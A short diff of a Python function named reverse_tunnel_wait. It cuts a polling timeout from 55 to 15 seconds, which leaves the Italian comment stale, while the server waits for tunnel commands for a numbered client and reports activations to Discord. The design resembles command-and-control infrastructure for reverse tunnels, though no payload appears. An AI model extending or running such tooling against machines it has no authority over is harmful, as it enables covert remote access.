@@ -162,7 +162,7 @@ def reverse_tunnel_wait():
     
     # Aspetta fino a 55 secondi per un comando di tunnel
     start_time = time.time()
-    while time.time() - start_time < 55:
+    while time.time() - start_time < 15:
         tunnel_command = client_manager.get_tunnel_command(int(client_id))
         if tunnel_command:
             send_to_discord(f"🔁 Tunnel attivato per client {client_id} -> {tunnel_command['target_host']}:{tunnel_command['target_port']}")
